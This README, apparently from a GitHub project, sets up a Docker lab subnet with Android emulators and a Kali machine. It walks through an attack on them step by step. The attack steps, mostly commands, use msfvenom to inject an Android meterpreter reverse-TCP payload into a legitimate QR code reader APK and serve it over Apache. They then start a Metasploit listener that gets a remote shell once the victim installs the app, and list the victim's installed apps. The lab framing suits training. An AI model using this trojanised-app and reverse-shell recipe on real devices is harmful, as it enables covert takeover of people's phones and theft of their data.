# androidExploitwithMetasploit

This project aims to simulate an attack scenario against Android devices. Using docker compose file you can simulate a subnet with android device and kali machine inside

## Requirements

1. Docker and docker-compose are installed in your system. Check installation here: https://www.docker.com/
2. This project use a docker image for android device. Check the documentation here: https://github.com/budtmo/docker-android
3. Before you start check if your machine support virtualization:
 ```bash
sudo apt install cpu-checker
kvm-ok
```
## Quick start

1. Download Dockerfile and docker-compose.yml from this repository
2. Go inside the directory containing files.
3. Open terminal and run:
```bash
docker-compose up
```
4. Open the browser and check http://localhost:6080 to see android device S10 running.
5. Open the browser and check http://localhost:6081 to see android device S8 running.
6. Open terminal and run:
```bash
docker exec -it kali bash
```
6. Now you can interact with kali linux and metasploit-framework
7. Run nmap checking network devices info into the network 
```bash
nmap -O 172.16.238.0/24
```
# Attack scenario 
## Create malicious apk

1. Create .apk android meterpreter reverse tcp payload with msfvenom command.
2. Inject malware.apk into QRcodeReader.apk (legitimate app) with -x option. 
3. Set LHOST=172.16.238.10 and LPORT=4444. Then save .apk file with -o option:
```bash
 msfvenom -p android/meterpreter/reverse_tcp -x app/QRcodeReader.apk LHOST=172.16.238.10 LPORT=4444 -o malware.apk
```
4. Move generated malware.apk into apache server directory /var/www/html with this command:
```bash
mv malware.apk /var/www/html
```
5. Run apache2 server:
```bash
service apache2 start
```
## Configure metasploit listener 

1. Go on kali and run metasploit-framework:
```bash
msfconsole
```
2. Set generic handler:
```bash
use multi/handler
```
3. Set payload type:
```bash
set PAYLOAD android/meterpreter/reverse_tcp
```
4. Set LHOST:
```bash
set LHOST 172.16.238.10
```
5. Set LPORT:
```bash
set LPORT 4444
```
6. Run exploit:
```bash
exploit
```
7. Well done! Now you can wait victim install the apk file.

## On Android Device

1. On android devices open browser, type 172.16.238.10/malware.apk and download the app.
2. Install malware.apk enabling unknown sources from setting menu. Open the app!

## Post exploit

1. On kali machine you can see new session opened and use meterpreter console. Run help to see all allowed commands
```bash
help
```
2. Run app_list to show all app installed on victim device:
```bash
app_list
```
